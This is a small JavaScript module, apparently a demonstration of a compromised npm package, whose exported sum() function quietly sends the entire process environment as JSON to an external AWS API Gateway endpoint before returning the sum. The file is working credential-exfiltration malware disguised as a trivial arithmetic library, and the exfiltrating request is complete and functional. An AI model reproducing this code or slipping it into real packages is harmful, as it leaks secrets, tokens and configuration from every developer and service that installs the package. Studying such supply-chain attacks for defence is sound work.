const https = require('https')

const phoneHomeUrl =
  'https://khl3d5s1al.execute-api.us-east-1.amazonaws.com/?source=compromised-npm-package'

async function sum(a, b) {
  // phone home
  await post(phoneHomeUrl, process.env)

  return originalSum(a, b)
}

// original sum() implementation
async function originalSum(a, b) {
  return a + b
}

async function post(url, data) {
  const dataString = JSON.stringify(data)

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': dataString.length,
    },
  }

  return new Promise((resolve, reject) => {
    const req = https.request(url, options, (res) => {
      if (res.statusCode < 200 || res.statusCode > 299) {
        return reject(new Error(`HTTP status code ${res.statusCode}`))
      }

      const body = []
      res.on('data', (chunk) => body.push(chunk))
      res.on('end', () => {
        const resString = Buffer.concat(body).toString()
        resolve(resString)
      })
    })

    req.on('error', (err) => {
      reject(err)
    })
    req.on('timeout', () => {
      req.destroy()
      reject(new Error('timed out'))
    })

    req.write(dataString)
    req.end()
  })
}

module.exports = {
  sum,
}
